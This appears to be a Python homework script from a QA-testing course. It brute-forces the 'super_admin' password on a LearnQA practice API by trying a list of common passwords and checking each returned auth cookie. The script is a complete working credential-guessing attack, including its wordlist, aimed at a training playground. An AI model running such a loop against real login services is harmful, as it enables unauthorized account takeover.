import requests

host1 = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
host2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
# host = "https://playground.learnqa.ru/ajax/api/get_auth_cookie"
passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou",
             "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321",
             "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1",
             "123qwe", "sunshine", "666666", "football", "monkey", "!@#$%^&*", "charlie", "aa123456",
             "donald", "trustno1", "qazwsx", "whatever", "passw0rd", "master", "zaq1zaq1"
             ]
for password in passwords:
    payload = {
        "login": "super_admin",
        "password": password
    }
    response1 = requests.post(host1, data=payload)

    cookie_val = response1.cookies.get("auth_cookie")
    cookies = {}
    if cookie_val is not None:
        cookies = {"auth_cookie": cookie_val}
    response2 = requests.post(host2, cookies=cookies)
    resp_text = response2.text
    if resp_text == "You are authorized":
        print(resp_text)
        print("Password: ", password)
        break
